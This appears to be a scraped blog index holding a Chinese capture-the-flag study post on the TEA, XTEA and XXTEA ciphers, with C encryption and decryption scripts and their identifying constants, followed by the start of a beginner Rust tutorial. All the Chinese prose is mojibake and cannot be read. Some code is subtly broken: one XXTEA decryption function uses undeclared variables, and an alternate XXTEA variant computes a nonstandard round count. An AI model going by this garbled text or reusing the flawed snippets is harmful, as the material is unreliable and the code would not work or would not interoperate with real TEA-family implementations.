å¯†è¿‡ç¨‹å¾ˆæ¸…æ™°ï¼Œé‚£ä¹ˆè§£å¯†è¿‡ç¨‹æˆ‘ä»¬åªè¦æŠŠå®ƒå€’è¿‡æ¥å†™å°±å¥½\n1 2 3 4 5 6 7 8 9 10 11 void decrypt(uint32_t* v,uint32_t* key){ uint32_t v0=v[0],v1=v[1],sum=0xC6EF3720,i; uint32_t delta=0x9e3779b9; uint32_t k0=key[0],k1=key[1],k2=key[2],k3=key[3]; for(i=0;i\u0026lt;32;i++){ v1-=((v0\u0026lt;\u0026lt;4)+k2)^(v0+sum)^((v0\u0026gt;\u0026gt;5)+k3); v0-=((v1\u0026lt;\u0026lt;4)+k0)^(v1+sum)^((v1\u0026gt;\u0026gt;5)+k1); sum-=delta; } v[0]=v0;v[1]=v1; } ä¸éš¾çœ‹å‡ºå…¶å®Teaç®—æ³•æœ‰å¾ˆé²œæ˜çš„ç‰¹å¾ï¼š\n1 2 3 4 5 å¯èƒ½å­˜åœ¨é’ˆå¯¹64bitä»¥åŠ128bitæ•°å­—çš„æ“ä½œï¼ˆè¾“å…¥çš„msgå’Œkeyï¼‰ å­˜åœ¨å…ˆè¿›è¡Œä½ç§»ï¼Œç„¶åå¼‚æˆ–çš„ç±»ä¼¼æ“ä½œï¼ˆ(z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2)è¿™ç±»æ··åˆå˜æ¢ï¼‰ å‰é¢ä¸€ä¸ªå¤æ‚çš„æ··åˆå˜æ¢çš„ç»“æœå¯èƒ½ä¼šå åŠ åˆ°å¦ä¸€ä¸ªå€¼ä¸Šï¼Œä¸¤è€…ç›¸äº’å åŠ ï¼ˆFeistel ç»“æ„ï¼‰ è·å–å¯†é’¥çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨æŸä¸€ä¸ªå¸¸é‡å€¼ä½œä¸ºä¸‹æ ‡ï¼ˆkey[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]ï¼‰ ä¼šåœ¨ç®—æ³•å¼€å§‹å®šä¹‰ä¸€ä¸ªdeltaï¼Œå¹¶ä¸”è¿™ä¸ªå€¼ä¸æ–­çš„å‚ä¸ç®—æ³•ï¼Œä½†æ˜¯ä»æ¥ä¸ä¼šå—åˆ°è¾“å…¥çš„å½±å“ï¼ˆdeltaæ•°å€¼ï¼Œæ ¹æ®è§è¿‡çš„é¢˜ç›®ä¸­å¾ˆå°‘ä¼šç›´æ¥ä½¿ç”¨0x9e3779b9ï¼‰ å³32æˆ–64è½®åŠ å¯†ï¼Œä»¥åŠæœ‰ä¸€ä¸ªå…³é”®çš„deltaå€¼ï¼Œéš¾ç‚¹ä¸»è¦æ˜¯å¦‚ä½•ä»å‡ºé¢˜äººé­”æ”¹è¿‡çš„ä»£ç ä¸­æ‰¾åˆ°v0ï¼Œv1ï¼Œdeltaä»¥åŠåŠ å¯†è¿‡ç¨‹ã€‚\nè§£å¯†è„šæœ¬å¯ä»¥å‚è€ƒçŸ¥è¯†åº“ä¸­ç°æœ‰çš„è„šæœ¬ï¼Œæ”¹æ”¹åŠ å¯†æ–¹å¼ï¼Œdeltaå€¼è¿™äº›å°±å¥½\nè„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 c //tea #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void Decrypt(uint32_t* data, uint32_t* key) { uint32_t v0 = data[0], v1 = data[1]; uint32_t delta = 0x9e3779b9; uint32_t sum = delta * 32; for (int i = 0; i \u0026lt; 32; i++) { v1 -= ((v0 \u0026lt;\u0026lt; 4) + key[2]) ^ (v0 + sum) ^ ((v0 \u0026gt;\u0026gt; 5) + key[3]); v0 -= ((v1 \u0026lt;\u0026lt; 4) + key[0]) ^ (v1 + sum) ^ ((v1 \u0026gt;\u0026gt; 5) + key[1]); sum -= delta; } data[0] = v0; data[1] = v1; } int main() { uint32_t encryptedData[] = { 0xc873914f, 0x4a628600, 0x20c77a1c, 0x1a877aaa, 0xd6faa982, 0x60d1c964, 0xb9884c32, 0x2a08a862, 0xc74a0036, 0x8f2ee196, 0xef08a6a9, 0xa3850896 }; uint32_t key[] = { 0x11111111, 0x11111111, 0x11111111, 0x11111111 }; int dataSize = sizeof(encryptedData) / sizeof(encryptedData[0]); for (int i = 0; i \u0026lt; dataSize; i += 2) { Decrypt(\u0026amp;encryptedData[i], key); } int decryptedSize = dataSize * 4 + 1; char* decryptedString = (char*)malloc(decryptedSize); memset(decryptedString, 0, decryptedSize); for (int i = 0; i \u0026lt; dataSize; i++) { char* bytes = (char*)\u0026amp;encryptedData[i]; decryptedString[i * 4] = bytes[0]; decryptedString[i * 4 + 1] = bytes[1]; decryptedString[i * 4 + 2] = bytes[2]; decryptedString[i * 4 + 3] = bytes[3]; } printf(\u0026#34;Decrypted String: %s\\n\u0026#34;, decryptedString); free(decryptedString); return 0; } xTeaç®—æ³•\rTEA ç®—æ³•å‘å¸ƒä¸ä¹…ï¼Œè¢«å‘ç°å­˜åœ¨ç¼ºé™·ï¼Œä½œä¸ºå›åº”ï¼Œè®¾è®¡è€…æå‡ºäº†ä¸€ä¸ª TEA çš„å‡çº§ç‰ˆæœ¬â€”â€”XTEAï¼ˆæœ‰æ—¶ä¹Ÿè¢«ç§°ä¸ºâ€œteanâ€ï¼‰ã€‚XTEA è·Ÿ TEA ä½¿ç”¨äº†ç›¸åŒçš„ç®€å•è¿ç®—ï¼Œä½†å®ƒé‡‡ç”¨äº†æˆªç„¶ä¸åŒçš„é¡ºåºï¼Œä¸ºäº†é˜»æ­¢å¯†é’¥è¡¨æ”»å‡»ï¼Œå››ä¸ªå­å¯†é’¥ï¼ˆåœ¨åŠ å¯†è¿‡ç¨‹ä¸­ï¼ŒåŸ 128 ä½çš„å¯†é’¥è¢«æ‹†åˆ†ä¸º 4 ä¸ª 32 ä½çš„å­å¯†é’¥ï¼‰é‡‡ç”¨äº†ä¸€ç§ä¸å¤ªæ­£è§„çš„æ–¹å¼è¿›è¡Œæ··åˆã€‚æ€»çš„æ¥è¯´ xTEAå°±æ˜¯åœ¨TEAç®—æ³•åŸºç¡€ä¸ŠåŠ äº†ä¸€äº›å†…å®¹ï¼Œè€ŒåŠ è§£å¯†è¿‡ç¨‹åŸºæœ¬æ²¡å˜ã€‚\nåŠ è§£å¯†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; /* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i \u0026lt; num_rounds; i++) { v0 += (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); sum += delta; v1 += (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); } v[0]=v0; v[1]=v1; } void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i \u0026lt; num_rounds; i++) { v1 -= (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); sum -= delta; v0 -= (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); } v[0]=v0; v[1]=v1; } int main() { uint32_t v[2]={1,2}; uint32_t const k[4]={2,2,3,4}; unsigned int r=32;//num_roundså»ºè®®å–å€¼ä¸º32 // vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•° // kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½ printf(\u0026#34;åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š%u %u\\n\u0026#34;,v[0],v[1]); encipher(r, v, k); printf(\u0026#34;åŠ å¯†åçš„æ•°æ®ï¼š%u %u\\n\u0026#34;,v[0],v[1]); decipher(r, v, k); printf(\u0026#34;è§£å¯†åçš„æ•°æ®ï¼š%u %u\\n\u0026#34;,v[0],v[1]); return 0; } xxTeaç®—æ³•\rç›¸æ¯”TEA,xTEAç®—æ³•ï¼ŒxxTEAç®—æ³•çš„ä¼˜åŠ¿æ˜¯åŸå­—ç¬¦ä¸²é•¿åº¦å¯ä»¥ä¸æ˜¯4çš„å€æ•°äº†\nåŠ å¯†è¿‡ç¨‹ï¼š\råŠ å¯†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define DELTA 0x9e3779b9 #define MX (((z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2)+(y\u0026gt;\u0026gt;3^z\u0026lt;\u0026lt;4))^((sum^y)+(key[(p\u0026amp;3)^e]^z))) void btea(uint32_t *v,int n,uint32_t const key[4])//nä¸ºvæ•°ç»„é•¿åº¦ { uint32_t y,z,sum; unsigned p,rounds,e; if(n\u0026gt;1) { rounds=6+52/n; sum=0; z=v[n-1]; do { sum+=DELTA;//å¾ªç¯åŠ å¯†è¿‡ç¨‹ e=(sum\u0026gt;\u0026gt;2)\u0026amp;3; for(p=0;p\u0026lt;n-1;p++) { y=v[p+1]; v[p]+=MX; z=v[p]; } y=v[0]; z=v[n-1]+=MX; } while(--rounds); } } è§£å¯†è¿‡ç¨‹ï¼š\rè§£å¯†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define DELTA 0x9e3779b9 #define MX (((z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2)+(y\u0026gt;\u0026gt;3^z\u0026lt;\u0026lt;4))^((sum^y)+(key[(p\u0026amp;3)^e]^z))) void dtea(uint32_t *v,int n,uint32_t const key[4])//nä¸ºvæ•°ç»„é•¿åº¦ { rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=n-1; p\u0026gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } xxTeaç®—æ³•çš„ç‰¹å¾ï¼š\n1 2 3 4 5 1. key 128 bit 2. enc =\u0026gt; 32*i(i=\u0026gt;2) 3. ç‰¹å¾é‡`0x9e3779b9` 4. ä¸¤å±‚å¾ªç¯ï¼Œé€šå¸¸è®°ä½æœ€å¤–å±‚çš„å¾ªç¯ä¸ºrounds=6+52/n 5. 5,2,3,4 å·¦å³ç§»æ“ä½œ è§£å¯†è„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define DELTA 0x9e3779b9 #define MX (((z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2) + (y\u0026gt;\u0026gt;3^z\u0026lt;\u0026lt;4)) ^ ((sum^y) + (key[(p\u0026amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n \u0026gt; 1) /* Encoding Part */ { rounds = 6 + 52/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=0; p\u0026lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n \u0026lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=n-1; p\u0026gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } int main() { uint32_t v[2]= {1,2}; uint32_t const k[4]= {2,2,3,4}; int n= 2; //nçš„ç»å¯¹å€¼è¡¨ç¤ºvçš„é•¿åº¦ï¼Œå–æ­£è¡¨ç¤ºåŠ å¯†ï¼Œå–è´Ÿè¡¨ç¤ºè§£å¯† // vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•° // kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½ printf(\u0026#34;åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š%u %u\\n\u0026#34;,v[0],v[1]); btea(v, n, k); printf(\u0026#34;åŠ å¯†åçš„æ•°æ®ï¼š%u %u\\n\u0026#34;,v[0],v[1]); btea(v, -n, k); printf(\u0026#34;è§£å¯†åçš„æ•°æ®ï¼š%u %u\\n\u0026#34;,v[0],v[1]); return 0; } //////////////////////åŒx///////////////////////////// #include \u0026lt;stdint.h\u0026gt; /* XXTEAåŠ å¯†ç®—æ³•çš„åŠ å¯†è¿‡ç¨‹ */ void xxtea_encrypt(uint32_t *v, int n, uint32_t *key) { uint32_t y, z, sum, delta, e; uint32_t p, q, rounds, limit; uint32_t *k = key; rounds = 6 + 52 / n; // è®¡ç®—åŠ å¯†è½®æ•° sum = 0; delta = 0x9E3779B9; // åˆå§‹åŒ–deltaå¸¸æ•° limit = rounds * delta; // è®¡ç®—sumçš„æœ€å¤§å€¼ q = 6 + limit / delta; while (q-- \u0026gt; 0) { // æ‰§è¡ŒåŠ å¯†è½®æ•° sum += delta; // æ›´æ–°sum e = sum \u0026gt;\u0026gt; 2 \u0026amp; 3; // è®¡ç®—eå€¼ for (p = 0; p \u0026lt; n; p++) { // å¯¹æ¯ä¸ªæ•°æ®å—æ‰§è¡ŒåŠ å¯†æ“ä½œ y = v[(p + 1) % n]; z = v[p] += ((v[(p + n - 1) % n] \u0026gt;\u0026gt; 5) ^ (y \u0026lt;\u0026lt; 2)) + ((y \u0026gt;\u0026gt; 3) ^ (v[(p + n - 1) % n] \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (k[(p ^ e) \u0026amp; 3] ^ v[(p + n - 1) % n])); // è®¡ç®—åŠ å¯†åçš„æ•°æ®å— } } } /* XXTEAåŠ å¯†ç®—æ³•çš„è§£å¯†è¿‡ç¨‹ */ void xxtea_decrypt(uint32_t *v, int n, uint32_t *key) { uint32_t y, z, sum, delta, e; uint32_t p, q, rounds, limit; uint32_t *k = key; rounds = 6 + 52 / n; // è®¡ç®—åŠ å¯†è½®æ•° sum = rounds * 0x9E3779B9; // åˆå§‹åŒ–sumå¸¸æ•° delta = 0x9E3779B9; // åˆå§‹åŒ–deltaå¸¸æ•° limit = rounds * delta; // è®¡ç®—sumçš„æœ€å¤§å€¼ q = 6 + limit / delta; while (q-- \u0026gt; 0) { // æ‰§è¡ŒåŠ å¯†è½®æ•° e = sum \u0026gt;\u0026gt; 2 \u0026amp; 3; // è®¡ç®—eå€¼ for (p = n - 1; p \u0026gt; 0; p--) { // å¯¹æ¯ä¸ªæ•°æ®å—æ‰§è¡Œè§£å¯†æ“ä½œ z = v[(p + n - 1) % n]; y = v[p] -= ((v[(p + n - 1) % n] \u0026gt;\u0026gt; 5) ^ (v[(p + 1) % n] \u0026lt;\u0026lt; 2)) + ((v[(p + 1) % n] \u0026gt;\u0026gt; 3) ^ (v[(p + n - 1) % n] \u0026lt;\u0026lt; 4)) ^ ((sum ^ v[(p + 1) % n]) + (k[(p ^ e) \u0026amp; 3] ^ v[(p + n - 1) % n])); // è®¡ç®—è§£å¯†åçš„æ•°æ®å— } z = v[(n + n - 1) % n]; y = v[0] -= ((v[(n + n - 1) % n] \u0026gt;\u0026gt; 5) ^ (v[(1) % n] \u0026lt;\u0026lt; 2)) + ((v[(1) % n] \u0026gt;\u0026gt; 3) ^ (v[(n + n - 1) % n] \u0026lt;\u0026lt; 4)) ^ ((sum ^ v[(1) % n]) + (k[(0 ^ e) \u0026amp; 3] ^ v[(n + n - 1) % n])); // ç‰¹æ®Šå¤„ç†ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªæ•°æ®å— sum -= delta; // æ›´æ–°sum } } Teaç³»åˆ—ç®—æ³•ç‰¹å¾æ€»ç»“ï¼š\ræ ¹æ®ä¸Šæ–‡å¯¹teaç®—æ³•çš„æºç åˆ†æï¼Œæˆ‘ä»¬å¾—å‡ºTEAç®—æ³•çš„å¦‚ä¸‹ç‰¹å¾ï¼š\nkey 128 bit {2,2,3,4} ä¼ å…¥ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•° ä¸‰ä¸ªç´¯åŠ é‡ï¼Œå…¶ä¸­æœ€åèµ‹å€¼ç»™ä¼ å…¥çš„å‚æ•° å­˜åœ¨\u0026laquo;4 , \u0026raquo;5 , xorç­‰æ“ä½œ ç‰¹å¾é‡ï¼š0x9e3779b9\nè‡³äºxTEA,xxTEAç­‰TEAç®—æ³•çš„ç‰¹æ®Šå˜ç§ï¼Œç”±äºéƒ½æ˜¯åœ¨åŸå§‹TEAç®—æ³•ä¸Šåšçš„å±€éƒ¨æ”¹åŠ¨ï¼Œç‰¹å¾ä¸Šä¸teaç®—æ³•æ²¡æœ‰æœ¬è´¨ä¸Šçš„ä¸åŒï¼Œåªä¸è¿‡å¯èƒ½æœ‰ä½è¿ç®—ä½æ•°ä¸åŒã€‚å…·ä½“åŒºåˆ«å¦‚ä¸‹ï¼š\nç›¸åŒç‚¹ï¼š\nkey 128 bitç‰¹å¾é‡0x9e3779b9 ä¸»è¦åŠ å¯†éƒ¨åˆ†è¿›è¡Œç§»ä½å’Œå¼‚æˆ–æ“ä½œ é¦–å…ˆå¦‚æœé¢˜ç›®ä¸­å‡ºç°å¸¸é‡0x9e3779b9ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯Teaç›¸å…³ç®—æ³•äº†ã€‚ åŒºåˆ†ï¼š Teaçš„ä¸»åŠ å¯†éƒ¨åˆ†ä¸º\u0026lt;\u0026lt;4,\u0026gt;\u0026gt;5,xorï¼Œå¾ªç¯32è½® xTeaçš„ä¸»åŠ å¯†éƒ¨åˆ†\u0026lt;\u0026lt;4,\u0026gt;\u0026gt;5,\u0026gt;\u0026gt;11,xor,å¾ªç¯æ¬¡æ•°ä¸å®šï¼Œä½†é€šå¸¸ä¹Ÿä¸º32è½®ï¼Œéœ€è¦ä¼ å…¥3ä¸ªå‚æ•° xxTeaçš„ä¸»åŠ å¯†éƒ¨åˆ†\u0026gt;\u0026gt;5,\u0026lt;\u0026lt;2,\u0026gt;\u0026gt;3,\u0026lt;\u0026lt;4,xor,å¾ªç¯æ¬¡æ•°ä¸º6+52/nï¼Œencé•¿åº¦å¤§äº64 éš¾ç‚¹è¿˜æ˜¯åœ¨ä»£ç å®¡è®¡éƒ¨åˆ†ï¼Œå­¦å¥½Cè¯­è¨€éå¸¸é‡è¦\nå‚è€ƒï¼š\nREä¸ç®—æ³•-teaåŠ å¯†ç®—æ³•\nTEAç³»åˆ—ç®—æ³•101\nTEA/XTEA/XXTEAç³»åˆ—ç®—æ³•\nTEAç®—æ³•è§£æ\nååˆ†é’Ÿå¸¦ä½ åƒé€TEAç®—æ³• è¿™ä¸ªè§†é¢‘æŒºé€‚åˆå…¥é—¨\n","date":"2025-06-01T10:31:23+08:00","image":"https://assets.animemotivation.com/wp-content/uploads/2017/07/Darjeeling-Girls-Und-Panzer.jpg","permalink":"https://Oight.github.io/p/tea/","title":"Tea"},{"content":"åœ¨ç½‘ç»œå®‰å…¨çš„å­¦ä¹ ä¸­è¶Šæ¥è¶Šå‘ç°æ²¡æœ‰ç¼–ç¨‹åŸºç¡€å¯¸æ­¥éš¾è¡Œï¼ŒåŒæ—¶æˆ‘ä¹Ÿæƒ³è¦å­¦ä¹ ç›¸å…³çš„ç¨‹åºå¼€å‘ï¼Œå› ä¸ºRuståŠŸèƒ½å¼ºå¤§ï¼Œå¹¶ä¸”æ˜¯ç³»ç»Ÿè¯­è¨€ï¼Œæˆ–è®¸ç®—æ¯”è¾ƒé€‚åˆæˆ‘çš„è¯­è¨€ï¼Ÿï¼ˆä½†æ„¿å§ï¼‰\nåè®°ï¼šå®¶äººä»¬ï¼Œä¸è¦å­¦ä¹ Rustï¼Œè¿™æ˜¯æˆ‘ç¬¬ äºŒ ä¸‰ å›› äº” å…­æ¬¡å…¥é—¨Rust\næˆ‘ä¸»è¦æ˜¯ä»ä»¥ä¸‹çš„æ–‡ç« ä¸­å­¦ä¹ Rustï¼Œä½†æ˜¯å‘ç°æ¯ä¸ªæ•™ç¨‹éƒ½æœ‰ä¸å¤ªé¢å‘åˆå­¦è€…çš„éƒ¨åˆ†ï¼Œå› æ­¤æˆ‘åšä¸€ä¸‹æ¢³ç†ï¼Œä¹Ÿæ–¹ä¾¿æˆ‘åé¢æŸ¥ç¼ºè¡¥æ¼ã€‚\nRust ç¨‹åºè®¾è®¡è¯­è¨€\nRust ç¨‹åºè®¾è®¡è¯­è¨€ ç®€ä½“ä¸­æ–‡ç‰ˆ\nRustè¯­è¨€åœ£ç»(Rust Course)\nRustè¯­è¨€ä¸­æ–‡ç‰ˆ\nRust å‚è€ƒæ‰‹å†Œ ä¸­æ–‡ç‰ˆ\né€šè¿‡ä¾‹å­å­¦ Rust ä¸­æ–‡ç‰ˆ\nRust æ•™ç¨‹\nRustè¾“å‡º\ræˆ‘ä»¬å°†ä»¥èœé¸Ÿæ•™ç¨‹ä¸Šçš„é¡ºåºæ¥è¿›è¡Œã€‚\nç¬¬ä¸€æ­¥ï¼Œç»å…¸çš„Hello,world\nHelloï¼ŒWorldï¼\råˆ›å»ºé¡¹ç›®ç›®å½•\rè¿™ä¸€æ­¥æ˜¯æ¯ä¸ªRustç¨‹åºçš„å¼€ç«¯ï¼Œæ¯ä¸€ä¸ªä¼Ÿå¤§çš„é¡¹ç›®éƒ½èµ·æºäºæ­¤ã€‚\næˆ‘ä»¬ä½¿ç”¨cargoæ¥åˆ›å»ºä¸€ä¸ªåä¸ºHello_Worldçš„é¡¹ç›®ï¼š\ncargo new Hello_World\nç„¶åæˆ‘ä»¬éœ€è¦è¿›å…¥åˆ°æˆ‘ä»¬æ–°åˆ›å»ºçš„Hello_Worldç›®å½•ä¸‹ï¼Œè¿™å°†æ˜¯æˆ‘ä»¬ç»å¸¸ç”¨åˆ°çš„ï¼Œ\ncd Hello_World\næœ‰æ—¶å€™å‘ç°ç¨‹åºæ— æ³•ç¼–è¯‘ï¼Ÿå…ˆçœ‹çœ‹æ˜¯å¦è¿›å…¥äº†æ­£ç¡®çš„é¡¹ç›®ç›®å½•ä¸‹ã€‚\næˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªé¡¹ç›®çš„é¡¹ç›®ç»“æ„ï¼š\n1 2 3 4 5 6 7 $ tree . â”œâ”€â”€ .git â”œâ”€â”€ .gitignore â”œâ”€â”€ Cargo.toml â””â”€â”€ src â””â”€â”€ main.rs å…¶ä¸­ï¼ŒCargo.toml æ˜¯ cargo ç‰¹æœ‰çš„é¡¹ç›®æ•°æ®æè¿°æ–‡ä»¶ã€‚å®ƒå­˜å‚¨äº†é¡¹ç›®çš„æ‰€æœ‰å…ƒé…ç½®ä¿¡æ¯ï¼Œå¦‚æœ Rust å¼€å‘è€…å¸Œæœ› Rust é¡¹ç›®èƒ½å¤ŸæŒ‰ç…§æœŸæœ›çš„æ–¹å¼è¿›è¡Œæ„å»ºã€æµ‹è¯•å’Œè¿è¡Œï¼Œé‚£ä¹ˆï¼Œå¿…é¡»æŒ‰ç…§åˆç†çš„æ–¹å¼æ„å»º Cargo.toml ã€‚æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºè¿™é‡Œå­˜å‚¨äº†è¿™ä¸ªé¡¹ç›®ä¸­æ‰€æœ‰æˆ‘ä»¬éœ€è¦çš„ä¾èµ–åº“ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œå‘Šè¯‰ç¨‹åºæˆ‘ä»¬è¦å¯¼å…¥å“ªäº›åº“ã€‚\n_Cargo.toml_ä¸€èˆ¬æ˜¯è¿™ä¸ªæ ·å­ï¼š\n1 2 3 4 5 6 7 8 // package é…ç½®æ®µè½ [package] name = \u0026#34;world_hello\u0026#34; version = \u0026#34;0.1.0\u0026#34; edition = \u0026#34;2021\u0026#34; // å®šä¹‰é¡¹ç›®ä¾èµ– [dependencies] // è¿™é‡Œåˆšæ‰“å¼€æ˜¯ç©ºçš„ï¼Œæˆ‘ä»¬éœ€è¦æŠŠæˆ‘ä»¬è¦çš„åº“å¤åˆ¶åˆ°è¿™é‡Œ mainå‡½æ•°\ræ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœ‹ main.rs ï¼Œæ­¤æ–‡ä»¶æ˜¯å½“å‰ Rust å·¥ç¨‹çš„å…¥å£æ–‡ä»¶ï¼Œæ¯ä¸€ä¸ªæ–°å»ºçš„Rusté¡¹ç›®éƒ½ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶ã€‚\næˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // è¿™æ˜¯æ³¨é‡Šå†…å®¹ï¼Œå°†ä¼šè¢«ç¼–è¯‘å™¨å¿½ç•¥æ‰ // å¯ä»¥å•å‡»é‚£è¾¹çš„æŒ‰é’® \u0026#34;Run\u0026#34; æ¥æµ‹è¯•è¿™æ®µä»£ç  -\u0026gt; // è‹¥æƒ³ç”¨é”®ç›˜æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨å¿«æ·é”® \u0026#34;Ctrl + Enter\u0026#34; æ¥è¿è¡Œ // è¿™æ®µä»£ç æ”¯æŒç¼–è¾‘ï¼Œä½ å¯ä»¥è‡ªç”±åœ°ä¿®æ”¹ä»£ç ï¼ // é€šè¿‡å•å‡» \u0026#34;Reset\u0026#34; æŒ‰é’®å¯ä»¥ä½¿ä»£ç æ¢å¤åˆ°åˆå§‹çŠ¶æ€ -\u0026gt; // è¿™æ˜¯ä¸»å‡½æ•° fn main() { // è°ƒç”¨ç¼–è¯‘ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œè¿™é‡Œçš„è¯­å¥å°†è¢«è¿è¡Œã€‚ // å°†æ–‡æœ¬æ‰“å°åˆ°æ§åˆ¶å° println!(\u0026#34;Hello World!\u0026#34;); } è¿™å‡ è¡Œå®šä¹‰äº†ä¸€ä¸ªåå« main çš„å‡½æ•°ã€‚main å‡½æ•°æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å‡½æ•°ï¼šåœ¨å¯æ‰§è¡Œçš„ Rust ç¨‹åºä¸­ï¼Œå®ƒæ€»æ˜¯æœ€å…ˆè¿è¡Œçš„ä»£ç ã€‚ç¬¬ä¸€è¡Œä»£ç å£°æ˜äº†ä¸€ä¸ªå«åš main çš„å‡½æ•°ï¼Œå®ƒæ²¡æœ‰å‚æ•°ä¹Ÿæ²¡æœ‰è¿”å›å€¼ã€‚å¦‚æœæœ‰å‚æ•°çš„è¯ï¼Œå®ƒä»¬çš„åç§°åº”è¯¥å‡ºç°åœ¨å°æ‹¬å· () ä¸­ã€‚\nå‡½æ•°ä½“è¢«åŒ…è£¹åœ¨ {} ä¸­ã€‚Rust è¦æ±‚æ‰€æœ‰å‡½æ•°ä½“éƒ½è¦ç”¨èŠ±æ‹¬å·åŒ…è£¹èµ·æ¥ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå°†å·¦èŠ±æ‹¬å·ä¸å‡½æ•°å£°æ˜ç½®äºåŒä¸€è¡Œå¹¶ä»¥ç©ºæ ¼åˆ†éš”ï¼Œæ˜¯è‰¯å¥½çš„ä»£ç é£æ ¼ã€‚\nå¾ˆç®€å•å§ï¼Œfn æ˜¯å®šä¹‰å‡½æ•°ï¼Œmainæ˜¯å‡½æ•°åï¼Œè¢«{}åŒ…è£¹èµ·æ¥çš„æ˜¯å‡½æ•°ä½“ã€‚\nåœ¨å‡½æ•°ä½“ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°ä½¿ç”¨println!(\u0026quot;Hello World!\u0026quot;);è¾“å‡ºäº† Hello Worldï¼\nè¿™é‡Œæœ‰å‡ 